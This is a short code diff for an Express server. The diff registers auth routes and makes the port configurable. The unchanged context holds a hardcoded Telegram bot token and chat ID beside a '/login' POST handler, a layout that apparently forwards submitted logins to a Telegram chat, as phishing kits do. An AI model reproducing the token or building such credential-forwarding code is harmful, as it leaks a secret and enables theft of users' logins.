@@ -1,9 +1,11 @@
 const express = require('express');
 const axios = require('axios');
+const { registerAuthRoutes } = require('./lib/auth-routes');
 const app = express();
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+registerAuthRoutes(app);
 
 const BOT_TOKEN = '8772797427:AAFLsQQMMiBUlZrxSESBU34JDVTHFAI06-w';
 const CHAT_ID = '6664763520';
@@ -63,4 +65,5 @@ app.post('/login', async (req, res) => {
     } catch (e) { res.sendStatus(500); }
 });
 
-app.listen(8080, '0.0.0.0', () => console.log("✅ Ready!"));
+const PORT = process.env.PORT || 8080;
+app.listen(PORT, '0.0.0.0', () => console.log(`✅ Ready on port ${PORT}!`));
